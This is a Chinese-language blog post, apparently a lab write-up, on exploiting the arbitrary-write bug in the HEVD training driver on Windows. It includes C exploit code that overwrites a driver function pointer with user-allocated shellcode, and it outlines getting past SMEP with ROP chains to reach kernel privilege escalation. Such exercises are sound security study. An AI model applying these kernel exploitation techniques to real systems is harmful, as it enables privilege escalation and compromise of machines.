<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | 【Win Pwn】HEVD-任意地址写</title><meta name="description" content="&lt;p&gt;非预期方法，暂时不会放出来&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】HEVD-任意地址写</h3><div class="article__date metadata"><div class="post-info">2024/02/23</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>非预期方法，暂时不会放出来</p>
<span id="more"></span>
<h1 id="hevd练习-任意地址写"><a class="markdownIt-Anchor" href="#hevd练习-任意地址写"></a> HEVD练习-任意地址写</h1>
<h2 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点"></a> 漏洞点</h2>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ab81f0548c9c7beae376282f0a845c14.png" alt="image-20240216173136321" /></p>
<h2 id="一点好玩的"><a class="markdownIt-Anchor" href="#一点好玩的"></a> 一点好玩的</h2>
<p>传入一个结构体，得到结构体过后写入内容</p>
<p>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>* What;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>* Where;</span><br><span class="line">&#125;arbitrary_write, *pArbitraryWrite;</span><br></pre></td></tr></table></figure>
<p>这里我做一个比较有意思的事儿，比如修改某个变量的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> vuln = <span class="number">0x10000</span>;</span><br><span class="line"><span class="type">int</span> pay = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] the vuln value is 0x%x\n&quot;</span>, vuln);</span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;pay;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;vuln;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">	payload, size,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">	&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] now vuln value is 0x%x&quot;</span>, vuln);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/46a0ef83a8f20889bc2d73915c1ab5f1.png" alt="image-20240216174148214" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2a02f670b395a1f09d2e95b1992ce847.png" alt="image-20240216174214564" /></p>
<p>利用ioctl的机制也可以实现读取某个地址的值</p>
<h2 id="预期打法"><a class="markdownIt-Anchor" href="#预期打法"></a> 预期打法</h2>
<p>最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了</p>
<p>但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了</p>
<p>利用之前的<code>NtQueryInfomation</code>的<code>ulGetKernelBase</code>函数可以获得HEVD的基地址</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9e0926c08abe24bc42efe409abb7e4a0.png" alt="image-20240216200738623" /></p>
<p>这里我就尝试覆写DbgPrintEx函数为shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">funcaddr hevd_base = ulGetKernelBase((PCHAR)<span class="string">&quot;HEVD&quot;</span>);</span><br><span class="line">funcaddr dbgprint_addr = hevd_base + <span class="number">0x2008</span>;</span><br><span class="line">funcaddr nt_base = ulGetKernelBase((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD SYS kernel base %llx\n&quot;</span>, hevd_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] ntoskrnl kernel base %llx\n&quot;</span>, nt_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD DbgPrint Address %llx\n&quot;</span>, dbgprint_addr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Allocate Shellcode Space\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>,</span><br><span class="line">	<span class="keyword">sizeof</span>(cmd),</span><br><span class="line">	MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">	PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (shellcode_addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[!] shellcode addr failed\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Shellcode addr %llx\n&quot;</span>, shellcode_addr);</span><br><span class="line"></span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;shellcode_addr;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)dbgprint_addr;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">	payload, size,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">	&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>注意，覆写的是<code>HEVD_BASE+0x2008</code>的值 所指向的值</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/575c9467678be806ed46eff70b42791e.png" alt="image-20240216210359750" /></p>
<p>成功覆写</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d176b13c88d12fff078f41084333a6ed.png" alt="image-20240216210450239" /></p>
<p>现在比较麻烦的就是过SMEP保护。</p>
<p>可以利用之前GS保护使用的内核栈泄露<br />
<a href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/">https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</a></p>
<p>直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址</p>
<h2 id="非预期利用"><a class="markdownIt-Anchor" href="#非预期利用"></a> 非预期利用</h2>
<p>写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开…SORRY</p>
<p>方法可以参考：<a target="_blank" rel="noopener" href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a><br />
（虽然我的方法比他简单很多）</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ffd66dc4226285ae67ff3ae69b05715a.png" alt="image-20240216232930887" /></p>
<p>可以优雅退出不卡顿</p>
<h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1>
<p><a target="_blank" rel="noopener" href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2024/02/24/win-hevd-exp-stackoverflow-GS/">prev_post</a><a class="pagination__link pagination__next" href="/2024/02/23/potato-1/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2026 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>